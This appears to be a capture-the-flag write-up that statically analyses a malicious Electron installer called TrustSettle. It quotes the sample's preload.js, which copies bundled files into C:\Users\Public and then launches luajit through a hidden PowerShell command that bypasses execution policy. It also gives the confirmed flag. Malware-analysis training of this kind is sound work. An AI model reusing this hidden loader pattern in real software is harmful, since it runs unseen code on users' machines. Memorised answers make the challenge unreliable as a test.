# SilentDividend Q1 — Finding `C:\Users\Public`

**Challenge:** Holmes CTF 2026 — Sherlock 01 / Silent Dividend  
**Question:** To which directory does the application copy the files bundled within the extraResources folder? (`*:\path\to\dir`)  
**Answer (confirmed):** `C:\Users\Public`  
**Format:** bare path — **do not** wrap as `HTB{...}`

---

## What the question is asking

After install, the Electron app does not leave its payload only inside Program Files. It **copies** everything in `extraResources` to a **world-writable** folder so a hidden PowerShell step can run without admin.

You must name that **destination directory**.

---

## Attack path

### 1. Unpack the installer (static)

- `SilentDividend.zip` → `danger.zip` (password in `DANGER.txt`) → `TrustSettle 1.0.0.exe`
- Extract with 7-Zip / `7za`. **Do not execute** the sample on the analyst host.

### 2. Find the Electron app

Installer extract should show:

```text
resources/app.asar
extraResources/          ← source of the copy
src/settlement.html
TrustSettle.exe
```

### 3. Extract `app.asar`

```bash
npx asar extract resources\app.asar asar\
```

Open **`asar/preload.js`** — this runs in the Electron main/preload context at startup, not in the page UI.

### 4. Read the copy loop (this is the answer)

**File:** `asar/preload.js`

```javascript
fs.readdirSync(
  path.resolve(`${process.resourcesPath}/../extraResources`)
).forEach(f =>
  fs.copyFileSync(
    path.resolve(`${process.resourcesPath}/../extraResources`, f),
    path.join('C:\\Users\\Public', f)
  )
);
```

In plain English:

1. List files in `.../extraResources`
2. Copy **each file** to `path.join('C:\Users\Public', filename)`

So `luajit.exe`, `api.txt`, `lua51.dll`, `.env` land in:

```text
C:\Users\Public
```

### 5. Confirm with the next line (same file)

```javascript
exec("powershell.exe -exec bypass -w hidden -nop -c \"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\"");
```

The launcher only makes sense if the copy destination is `C:\Users\Public`.

### 6. Submit

```text
C:\Users\Public
```

UI hint `*:\path\to\dir` → drive + folder. Trailing backslash usually optional; try without first.

---

## Mini example (Node `path.join`)

```javascript
const path = require('path');
console.log(path.join('C:\\Users\\Public', 'luajit.exe'));
// C:\Users\Public\luajit.exe
```

The **directory** is `C:\Users\Public`, not the full file path.

---

## Team checklist

- [ ] Extract asar — do not run TrustSettle.
- [ ] Open `preload.js` (not settlement.html for this question).
- [ ] Find `copyFileSync` + `extraResources`.
- [ ] Read destination `C:\Users\Public`.
- [ ] Cross-check PowerShell `exec` paths.
- [ ] Submit bare `C:\Users\Public`.

---

## One-line brief

> TrustSettle’s preload copies every `extraResources` file into `C:\Users\Public`, then launches `luajit.exe` from there.

---

*Confirmed flag. Static analysis only.*
